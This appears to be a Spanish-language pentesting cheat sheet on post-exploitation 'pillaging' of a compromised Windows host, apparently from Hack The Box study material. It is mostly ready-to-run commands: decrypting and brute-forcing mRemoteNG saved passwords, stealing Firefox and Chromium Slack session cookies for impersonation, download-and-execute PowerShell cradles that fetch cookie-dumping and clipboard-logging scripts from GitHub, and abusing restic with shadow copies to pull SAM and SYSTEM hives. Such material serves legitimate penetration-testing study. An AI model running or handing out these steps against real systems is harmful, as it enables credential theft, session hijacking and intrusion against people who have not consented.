# Pillaging (Saqueo de información)

El **pillaging** es el proceso de extraer información valiosa de un sistema comprometido. Esta información puede ser credenciales, datos personales, configuraciones de red, copias de seguridad, historiales o cualquier dato útil para moverse lateralmente o escalar privilegios en un pentest.

## Fuentes de datos comunes
- Aplicaciones y servicios instalados  
- Sitios web, bases de datos y Active Directory  
- Servidores de archivos, backup, monitoreo y mensajería  
- Historiales de usuario, documentos sensibles y configuraciones (web.config, etc.)  
- Navegadores (cookies, tokens)  
- Roles, privilegios y auditorías previas  

---

## Identificación de aplicaciones instaladas

### Comando para listar aplicaciones en directorios típicos
```cmd
C:\> dir "C:\Program Files"
```

### Usar PowerShell para obtener apps desde el registro
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

---

## mRemoteNG: Robo de credenciales

mRemoteNG almacena conexiones en `confCons.xml` en `%USERPROFILE%\AppData\Roaming\mRemoteNG`.

### Ubicar el archivo
```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG
```

### Descifrar contraseñas con master password por defecto (`mR3m`)
```bash
python3 mremoteng_decrypt.py -s "<cadena_encriptada>"
```

### Descifrar usando una master password personalizada
```bash
python3 mremoteng_decrypt.py -s "<cadena_encriptada>" -p admin
```

### Fuerza bruta con diccionario
```bash
for password in $(cat /usr/share/wordlists/fasttrack.txt); do
  python3 mremoteng_decrypt.py -s "<cadena_encriptada>" -p $password 2>/dev/null
done
```

---

## Cookies de IM Clients (Slack)

Las cookies pueden permitir **suplantar sesiones** de usuarios en aplicaciones como Slack.

### Extracción desde Firefox
1. Localizar base de datos de cookies:
	nota: podemos buscar con `dir cookies.sqlite /b /s`
```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
2. Extraer cookie:
```bash
python3 cookieextractor.py --dbpath "./cookies.sqlite" --host slack --cookie d
```
3. Usar la cookie con extensiones como **Cookie-Editor** para iniciar sesión.

---

### Extracción desde navegadores Chromium (Chrome, Edge)

Cookies en `Cookies` están cifradas con DPAPI. Se usa **SharpChromium** para obtenerlas.

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```

NOTA: Para buscar el archivo: `dir Cookies /b /s` si quieres buscar en todo el sistema ejecuta ese comando desde C:\
Si el archivo está en otra ruta:
```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

---

## Monitoreo del Portapapeles (Clipboard)

Capturar contenido copiado (credenciales, tokens):

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

---

## Abuso de Servidores de Backup (Ejemplo: restic)

Permite crear y restaurar copias de seguridad para extraer archivos sensibles (SAM, SYSTEM, etc.).

### Inicializar repositorio
```powershell
mkdir E:\restic2
restic.exe -r E:\restic2 init
```

### Realizar backup
```powershell
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder
```

### Backup con Shadow Copy (VSS)
```powershell
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

### Listar snapshots
```powershell
restic.exe -r E:\restic2\ snapshots
```

### Restaurar backup
```powershell
restic.exe -r E:\restic2\ restore <ID> --target C:\Restore
```
